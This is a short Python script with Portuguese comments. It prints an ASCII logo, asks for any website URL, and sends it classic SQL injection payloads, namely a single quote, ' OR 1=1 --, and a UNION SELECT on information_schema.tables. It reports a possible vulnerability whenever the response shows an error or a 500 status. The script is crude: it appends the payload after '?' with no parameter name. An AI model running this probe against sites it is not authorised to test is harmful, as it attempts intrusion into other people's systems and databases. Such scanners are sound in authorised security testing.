from colorama import init, Fore, Back, Style
init()
logo = ("""
░░░████████░░░░█████████████████░░░
░░░██▄██▄██░░░░██▄██▄██▄██▄██▄██░░░
░░░████████░░░░█████████████████░░░
░░░██▄██░░░░░░░██▄██░░░░░░░██▄██░░░
░░░█████░░░░░░░█████░░░░░░░█████░░░
░░░██▄██░░░░░░░██▄██░░░░░░░██▄██░░░
░░░█████████████████░░░░████████░░░
░░░██▄██▄██▄██▄██▄██░░░░██▄██▄██░░░
░░░█████████████████░░░░████████░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░█████████████████████████████░░░
░░░██▄██▄██▄██▄██▄██▄██▄██▄██▄██░░░
░░░█████████████████████████████░░░
░░░██▄██░░░░░░░░░░░░░░░░░░░██▄██░░░
░░░█████░█████░░░░░░░░░░░░░█████░░░
░░░██▄██░██▄██░░░░░░░░░░░░░██▄██░░░
░░░█████████████████████████████░░░
░░░██▄██▄██▄██▄██▄██▄██▄██▄██▄██░░░
░░░█████████████████████████████░░░
░░░░░░██▄██░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░█████░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░█████████████████████████████░░░
░░░██▄██▄██▄██▄██▄██▄██▄██▄██▄██░░░
░░░█████████████████████████████░░░
░░░██▄██░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░█████░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░██▄██░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░█████░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░██▄██░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░█████░░░░░░░░░░░░░░░░░░░░░░░░░░░
""")
print (logo)

import requests

def testa_injecao_sql(url):
    # Lista de payloads para testar
    payloads = ["'", "' OR 1=1 --", "' UNION SELECT * FROM information_schema.tables --"]

    for payload in payloads:
        try:
            # Envia requisição GET com o payload
            resposta = requests.get(url + "?" + payload, timeout=5)

            # Verifica se o payload teve efeito
            if "error" in resposta.text.lower() or resposta.status_code == 500:
                print(f"Possivel SQL injection vulnerabilidade encontrada: {url} + {payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Erro ao testar {url}: {e}")
            return False

    print(f"Não encontrada vulnerabilidade SQL em {url}")
    return False

url = input("Digite a URL com protocolo http ou https do site para testar: ")
testa_injecao_sql(url)


